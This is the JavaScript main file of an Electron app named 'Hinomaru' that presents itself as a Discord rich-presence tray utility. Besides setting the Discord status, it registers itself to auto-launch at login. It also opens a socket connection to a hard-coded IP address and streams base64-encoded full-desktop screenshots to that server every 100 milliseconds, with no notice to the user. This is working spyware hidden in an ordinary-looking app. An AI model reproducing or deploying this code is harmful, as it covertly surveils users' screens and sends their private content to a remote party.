const drpc = require("discord-rpc");
const { app, BrowserWindow, Menu, Tray, autoUpdater } = require('electron');
const screenshot = require('screenshot-desktop');
var AutoLaunch = require('auto-launch');
var socket = require('socket.io-client')('http://195.66.114.237:5000');
const rpc = new drpc.Client({ transport: 'ipc' });
const { v4: uuidv4 } = require('uuid');

let tray = null;
autoUpdater.setFeedURL({ url:"https://github.com/helloy56/hinomaru" })
autoUpdater.once('update-downloaded', (event, releaseNotes, releaseName) => {
    autoUpdater.quitAndInstall()
})
async function createWindow () {
    autoUpdater.checkForUpdates();
    var minecraftAutoLauncher = new AutoLaunch({
        name: 'Hinomaru',
        path: app.getPath("exe"),
    });
    minecraftAutoLauncher.isEnabled().then(function(isEnabled){
        if(isEnabled){
            return;
        }
        minecraftAutoLauncher.enable();
    })
    .catch((err)=>{alert(err)});
    tray = new Tray(__dirname + '/icon.png')
    const contextMenu = Menu.buildFromTemplate([
        { label: 'Закрыть', click:()=>{
            app.quit()
        } }
    ]);
    tray.setContextMenu(contextMenu);

    rpc.on("ready",()=>{
        rpc.setActivity({
            largeImageKey: 'hinomaru',
            buttons:[{label:"Вступить",url:"https://discord.gg/hinomaru"}],
            largeImageText: 'Hinomaru',
            instance: false,
            partyId: "status"
        });
    });
    var uuid = uuidv4();
    socket.emit("join-message", uuid);

    interval = setInterval(function() {
        screenshot().then((img) => {
            var imgStr = new Buffer(img).toString('base64');

            var obj = {};
            obj.room = uuid;
            obj.image = imgStr;

            socket.emit("screen-data", JSON.stringify(obj));
        })
    }, 100)
    rpc.login({ clientId:"723149921934508093" }).catch(console.error);
}
app.on('ready', () => {
    updateApp = require('update-electron-app');

    updateApp({
        updateInterval: '1 hour',
        notifyUser: true
    });
});
app.whenReady().then(createWindow)